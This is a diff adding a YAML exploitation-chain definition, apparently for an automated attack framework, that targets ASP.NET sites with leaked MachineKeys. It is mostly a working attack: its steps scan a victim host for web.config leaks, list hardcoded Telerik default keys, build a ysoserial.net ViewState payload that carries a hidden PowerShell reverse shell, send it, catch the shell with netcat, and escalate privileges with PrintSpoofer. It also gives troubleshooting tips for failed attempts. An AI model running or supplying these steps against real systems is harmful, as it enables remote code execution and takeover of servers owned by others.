@@ -1,0 +1,98 @@
+chain_id: aspnet_viewstate_rce
+title: "ASP.NET — leaked MachineKey → __VIEWSTATE deserialization RCE"
+severity: CRITICAL
+tags: [aspnet, iis, web, viewstate, machinekey, deserialization, rce, ysoserial]
+
+trigger:
+  any_of:
+    - { kind: "viewstate-rce" }
+    - { product_pattern: "(?i)microsoft-iis|asp\\.net" }
+    - { banner_pattern: "(?i)x-aspnet-version|x-powered-by:.*asp\\.net" }
+    - { path_pattern: "(?i)\\.aspx?$|/web\\.config$|/machineKey\\.config$" }
+
+description: |
+  ASP.NET WebForms signs / encrypts `__VIEWSTATE` with the
+  application's MachineKey (validation + decryption keys). When
+  the keys leak — via an exposed `web.config`, a default Telerik
+  install, a recycled key from a Microsoft sample, or a backup
+  copy left in `inetpub\\backup\\` — an attacker forges a
+  serialized `LosFormatter` payload that ASP.NET deserializes
+  on parse. ysoserial.net's `TextFormattingRunProperties` gadget
+  pops cmd as the IIS app pool identity. Constant in real
+  engagements; not a single CVE because it is a key-management
+  failure rather than a code bug.
+
+steps:
+  - id: 1
+    title: "Find an .aspx page that posts a viewstate"
+    command: |
+      curl -sk "https://$VICTIMA/" | grep -Eo 'href="[^"]+\\.aspx"' | head -10
+      # /Login.aspx, /default.aspx, /admin/login.aspx are typical.
+      curl -sk "https://$VICTIMA/Login.aspx" | grep -Eo '__VIEWSTATE[^"]*' | head -1
+
+  - id: 2
+    title: "Hunt for leaked MachineKey material"
+    command: |
+      # Common exposures — check each:
+      for p in web.config web.config.bak web.config.old machineKey.config \
+               backup/web.config Web_Config.xml ConnectionStrings.config; do
+        printf '%-40s ' "$p"
+        curl -sk -o /dev/null -w '%{http_code}\\n' "https://$VICTIMA/$p"
+      done
+      # Telerik UI default key (Telerik.Web.UI < 2017.1.118):
+      echo "validationKey=B89B2718D5575C53A45A4951B549F50AB7AB3F88AC73D60C6F4C12C49AD86B7F"
+      echo "decryptionKey=3D4A4D58FB7DCFD5C00D80E78EAA1057E72B795EE3B07B73"
+
+  - id: 3
+    title: "Generate a payload with ysoserial.net"
+    command: |
+      git clone https://github.com/pwntester/ysoserial.net /tmp/ysn
+      cd /tmp/ysn && nuget restore && msbuild
+      mono /tmp/ysn/bin/Debug/ysoserial.exe \
+        -p ViewState \
+        -g TextFormattingRunProperties \
+        -c "powershell -NoP -W Hidden -Enc <base64-of-rev-shell>" \
+        --validationkey="$VKEY" --validationalg="HMACSHA256" \
+        --decryptionkey="$DKEY" --decryptionalg="AES" \
+        --path="/Login.aspx" --apppath="/" \
+        --islegacy
+
+  - id: 4
+    title: "Fire the payload at the target page"
+    command: |
+      VS=$(cat payload.b64)
+      curl -sk "https://$VICTIMA/Login.aspx" \
+        --data-urlencode "__VIEWSTATE=$VS" \
+        --data '__VIEWSTATEGENERATOR=00000000' \
+        -o /dev/null
+      # Reverse shell lands as IIS_IUSRS or the configured app pool identity.
+      nc -lvnp 4444
+
+  - id: 5
+    title: "Privesc — JuicyPotato / PrintSpoofer if SeImpersonatePrivilege"
+    command: |
+      # IIS app pools on 2016+ ship SeImpersonatePrivilege by default.
+      # Check inside the shell:
+      whoami /priv
+      # Then drop PrintSpoofer.exe and run:
+      .\\\\PrintSpoofer.exe -i -c cmd
+
+common_errors:
+  - error: "no MachineKey leak found"
+    solution: |
+      Try CVE-2017-9248 (Telerik dialogParameters bruteforce) and
+      CVE-2017-11317 (Telerik RAU file upload) — same product
+      family, common on the same hosts. Also check for
+      `__VIEWSTATEENCRYPTED` cookie absence (ViewStateUserKey
+      missing), which sometimes lets you replay a captured
+      viewstate without forging.
+  - error: "ysoserial generates payload but server returns 'invalid viewstate MAC'"
+    solution: |
+      Wrong validation algorithm. .NET 4.5+ defaults switched from
+      SHA1 to HMACSHA256. Try both `--validationalg=SHA1` and
+      `HMACSHA256`. Also confirm `--apppath` matches the IIS
+      virtual directory exactly (case-sensitive).
+
+references:
+  - https://github.com/pwntester/ysoserial.net
+  - https://www.synacktiv.com/en/publications/exploiting-net-managed-debugger-machinekey-leakage-to-rce.html
